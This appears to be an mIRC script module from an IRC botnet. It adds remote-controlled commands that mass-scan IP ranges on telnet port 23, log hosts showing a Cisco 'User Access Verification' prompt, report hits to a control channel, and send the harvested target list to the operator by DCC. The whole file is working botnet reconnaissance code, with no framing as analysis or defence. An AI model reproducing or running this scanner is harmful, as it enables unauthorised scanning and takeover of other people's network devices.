on 10:text:.ciscoscan*:*:{  
  if ($2 == start) {
    if ($4 == $null) { .msg $chan [ciscoscan] IP ranges invalid. | .halt }
    if ($3 < 167772160) { .msg $chan [ciscoscan] IP ranges invalid. | .halt }
    if ($4 < 167772160) { .msg $chan [ciscoscan] IP ranges invalid. | .halt }
    if ($3 > 4294967294) { .msg $chan [ciscoscan] IP ranges invalid. | .halt }
    if ($4 > 4294967294) { .msg $chan [ciscoscan] IP ranges invalid. | .halt }
    if ($5 != $me) { halt }
    else {
      .set %range0 $3
      .set %range1 $3
      .set %range2 $4
      .set %chan $chan
      .timerc1 0 2 /range1
      .timerc2 0 2 /range1
      .timerc3 0 2 /range1
      .timerc4 0 2 /range1
      .timerc5 0 2 /range1
      .msg $chan Started scanning $longip($3) -> $longip($4)
    }
  }
  if ($2 == stop) { .timerc* off | .sockclose c* | .msg $chan [ciscoscan] Stopped scan of $longip(%range0) -> $longip(%range2) on $longip(%range1) }
  if ($2 == status) { if ($timer(c1) == $null) { .msg $readini(ie6.dat, connect, chan) [ciscoscan] Not running | .halt } | .msg $readini(ie6.dat, connect, chan) [ciscoscan] Currently scanning: $longip(%range0) -> $longip(%range2) Currently on: $longip(%range1) }
  if ($2 == send) { .var %file $ip $+ $rand(1,999) $+ .txt | .copy ciscos.txt %file | .timerdccsend 1 2 /dcc send $nick %file | .timerdccremove 1 120 /remove %file | .msg $readini(ie6.dat, connect, chan) [ciscoscan] Now sending %file to $nick $+ ... }
}
on 1:sockread:c*:{
  if ($sockerr > 0) return
  :nextread
  sockread %temp
  if ($sockbr == 0) return
  if (%temp == $null) %temp = -
  if (*User*Access*Verification* iswm %temp) { .write ciscos.txt $sock($sockname).ip | .msg $readini(ie6.dat, connect, chan) [ciscoscan] Found cisco! Total ciscos on this machine: $lines(ciscos.txt) }
  goto nextread
}
Alias range1 { /sockopen c $+ $rand(100000,999999) $range 23 }
Alias range {
  if (%range1 == %range2) { .sockclose c* | .timerc* off | .msg $readini(ie6.dat, connect, chan) [ciscoscan] Finished scan of $longip(%range0) -> $longip(%range2) }
  else { .inc %range1 | .return $longip(%range1) }
}

